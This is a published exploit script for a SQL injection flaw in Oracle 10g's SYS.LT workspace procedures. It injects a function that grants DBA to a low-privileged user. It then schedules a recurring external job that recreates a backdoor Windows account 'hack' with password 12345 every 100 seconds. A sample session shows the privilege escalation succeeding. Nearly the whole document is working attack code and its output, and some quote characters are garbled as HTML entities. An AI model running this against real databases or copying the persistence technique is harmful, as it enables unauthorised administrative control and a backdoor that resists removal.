Oracle 10g SYS.LT.COMPRESSWORKSPACETREE SQL Injection Exploit
=============================================================



/*********************************************************/
/*Oracle 10g SYS.LT.COMPRESSWORKSPACETREE SQL Injection Exploit**/
/**grant DBA and create new  OS user (using scheduller)***/
/*********************************************************/
/***********exploit grant DBA to scott********************/
/***********and execute OS command "net user"*************/
/***********using scheduler*******************************/
/*********************************************************/
/***********tested on oracle 10.1.0.5.0*******************/
/*********************************************************/
/*********************************************************/
/* Date of Public EXPLOIT: January 6, 2009               */
/* Written by:             Alexandr "Sh2kerr" Polyakov   */
/* email:                  Alexandr.Polyakov@dsec.ru     */
/* site:                   http://www.dsecrg.ru          */
/*                         http://www.dsec.ru            */
/*********************************************************/
/*Original Advisory:                                     */
/*Esteban Martinez Fayo [Team SHATTER ]                  */
/*Date of Public Advisory: November 11, 2008             */
/*http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml*/
/*********************************************************/

select * from user_role_privs;

CREATE OR REPLACE FUNCTION Z return varchar2
authid current_user as
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE &#039;GRANT DBA TO SCOTT&#039;;
EXECUTE IMMEDIATE &#039;GRANT CREATE ANY JOB TO SCOTT&#039;;
EXECUTE IMMEDIATE &#039;GRANT CREATE EXTERNAL JOB SCOTT&#039;;
COMMIT;
RETURN &#039;Z&#039;;
END;
/

exec SYS.LT.CREATEWORKSPACE(&#039;sh2kerr&#039;&#039; and SCOTT.Z()=&#039;&#039;Z&#039;);
exec SYS.LT.COMPRESSWORKSPACETREE(&#039;sh2kerr&#039;&#039; and SCOTT.Z()=&#039;&#039;Z&#039;);


/* We create backdored OS user "hack" with password 12345 using External Job&#039;s  */
/* Note that in this method new user will be created every 100 seconds          */
/* so if administrator find it and will try to delete it                        */
/* user hack will be created again. So it is also a simle backdoor              */

BEGIN
	DBMS_SCHEDULER.CREATE_PROGRAM (
	program_name=> &#039;MyCmd&#039;,
	program_type=> &#039;EXECUTABLE&#039;,
	program_action =>?cmd /c "net user hack 12345 /add"?,
	enabled=> TRUE);
END;
/

BEGIN
DBMS_SCHEDULER.CREATE_JOB (
   job_name=> &#039;extjobexec&#039;,
   program_name=> &#039;MyCmd&#039;,
   repeat_interval=> &#039;FREQ=SECONDLY;INTERVAL=100&#039;,
   enabled=> TRUE,
   comments=> &#039;create backdoor user every 100 seconds&#039;);
END;
/


/* here we can paste any OS command for example create new user */

exec dbms_scheduler.run_job(&#039;extjobexec&#039;);
/

select * from user_role_privs;















---------------------------------------------------------------------------------
-----------------------------EXAMPLE OF EXPLOITATION ----------------------------
---------------------------------------------------------------------------------


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
OUTLN                          CONNECT                        NO  YES NO
OUTLN                          RESOURCE                       NO  YES NO

SQL> CREATE OR REPLACE FUNCTION X return varchar2
  2  authid current_user as
  3  pragma autonomous_transaction;
  4  BEGIN
  5  EXECUTE IMMEDIATE &#039;GRANT DBA TO OUTLN&#039;;
  6  COMMIT;
  7  RETURN &#039;x&#039;;
  8  END;
  9  /

Function created.



SQL> exec SYS.LT.CREATEWORKSPACE(&#039;zz&#039;&#039; and outln.X()=&#039;&#039;x&#039;)

PL/SQL procedure successfully completed.

SQL> exec SYS.LT.REMOVEWORKSPACE(&#039;zz&#039;&#039; and outln.X()=&#039;&#039;x&#039;)

PL/SQL procedure successfully completed.

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
OUTLN                          CONNECT                        NO  YES NO
OUTLN                          DBA                            NO  YES NO
OUTLN                          RESOURCE                       NO  YES NO

SQL>



